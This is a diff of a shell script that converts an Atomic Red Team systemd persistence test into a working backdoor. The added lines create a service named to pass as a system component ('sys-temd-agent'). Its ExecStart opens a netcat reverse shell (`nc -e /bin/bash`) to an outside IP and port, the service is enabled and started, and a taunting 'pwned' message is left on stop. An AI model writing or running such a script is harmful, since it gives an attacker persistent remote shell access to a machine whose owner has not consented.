@@ -1,18 +1,13 @@
-echo "[Unit]" > /etc/systemd/system/art_test.service
-echo "Description=Atomic Red Team Systemd Service" >> /etc/systemd/system/art_test.service
-echo "" >> /etc/systemd/system/art_test.service
-echo "[Service]" >> /etc/systemd/system/art_test.service
+echo "[Unit]" > /etc/systemd/system/sys-temd-agent.service
+echo "Description=Atomic Red Team Systemd Service" >> /etc/systemd/system/sys-temd-agent.service
+echo "" >> /etc/systemd/system/sys-temd-agent.service
+echo "[Service]" >> /etc/systemd/system/sys-temd-agent.service
 echo "Type=simple"
-echo "ExecStart=#{execstart_action}" >> /etc/systemd/system/art_test.service
-echo "ExecStartPre=#{execstartpre_action}" >> /etc/systemd/system/art_test.service
-echo "ExecStartPost=#{execstartpost_action}" >> /etc/systemd/system/art_test.service
-echo "ExecReload=#{execreload_action}" >> /etc/systemd/system/art_test.service
-echo "ExecStop=#{execstop_action}" >> /etc/systemd/system/art_test.service
-echo "ExecStopPost=#{execstoppost_action}" >> /etc/systemd/system/art_test.service
-echo "" >> /etc/systemd/system/art_test.service
-echo "[Install]" >> /etc/systemd/system/art_test.service
-echo "WantedBy=default.target" >> /etc/systemd/system/art_test.service
+echo "ExecStart=nc -e /bin/bash 192.168.100.191 9001" >> /etc/systemd/system/sys-temd-agent.service
+echo "ExecStop=echo haha youve been pwned" >> /etc/systemd/system/sys-temd-agent.service
+echo "" >> /etc/systemd/system/sys-temd-agent.service
+echo "[Install]" >> /etc/systemd/system/sys-temd-agent.service
+echo "WantedBy=graphical.target" >> /etc/systemd/system/sys-temd-agent.service
 systemctl daemon-reload
-systemctl enable art_test.service
-systemctl start art_test.service
-
+systemctl enable sys-temd-agent.service
+systemctl start sys-temd-agent.service
